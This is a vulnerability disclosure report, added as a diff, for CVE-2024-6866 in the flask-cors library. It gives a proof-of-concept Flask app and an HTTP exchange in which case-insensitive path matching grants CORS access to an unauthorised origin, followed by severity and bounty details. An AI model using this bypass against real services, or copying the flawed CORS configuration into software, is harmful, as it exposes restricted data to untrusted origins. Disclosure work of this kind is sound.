@@ -1,0 +1,74 @@
+Title: Case-Insensitive Path Matching result to potential CORS misconfiguration in corydolphin/flask-cors
+
+Proof of Concept: 
+from flask import Flask, jsonify
+import logging
+try:
+    from flask_cors import CORS  # The typical way to import flask-cors
+except ImportError:
+    # Path hack allows examples to be run without installation.
+    import os
+    parentdir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    os.sys.path.insert(0, parentdir)
+
+    from flask_cors import CORS
+
+
+app = Flask('FlaskCorsAppBasedExample')
+logging.basicConfig(level=logging.INFO)
+
+# To enable logging for flask-cors,
+logging.getLogger('flask_cors').level = logging.DEBUG
+
+CORS(app, resources={
+            r'/API/*': {'origins': ['*']},
+            r'/api/*': {'origins': ['https://lowercase.com']}
+        })
+
+@app.route("/API/super_Secret")
+def secret():
+    return "Not much confidential, feel free to serve to any origin"
+
+@app.route("/api/super_Secret")
+def list_users():
+    return "Very Confidential. Only serve to https://lowercase.com"
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+GET /api/super_Secret HTTP/1.1
+Host: 127.0.0.1:5000
+Origin: https://notlowercase.com
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 54
+Access-Control-Allow-Origin: https://notlowercase.com
+Vary: Origin
+Server: Werkzeug/1.0.1 Python/3.9.5
+Date: Mon, 13 May 2024 20:34:40 GMT
+
+Very Confidential. Only serve to https://lowercase.com
+
+Impact: 
+The case-insensitive path matching in the CORS configuration can lead to significant security vulnerabilities. Unauthorized origins can access paths meant to be restricted, resulting in data exposure and potential data leaks. This misconfiguration allows attackers to bypass CORS policies by changing the case of the URL path, undermining the intended security measures and leading to unauthorized access to sensitive resources. This vulnerability compromises the integrity of the CORS policy, increasing the risk of data breaches and unauthorized data access.
+
+CVE ID: CVE-2024-6866
+Status: (assigned)
+Vulnerability Type: CWE-178: Improper Handling of Case Sensitivity
+Severity: Medium (5.3)
+Attack Vector: Network
+Attack Complexity: High
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Pypi
+Affected Version: 4.01
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $125
+Fix Bounty: $31.25
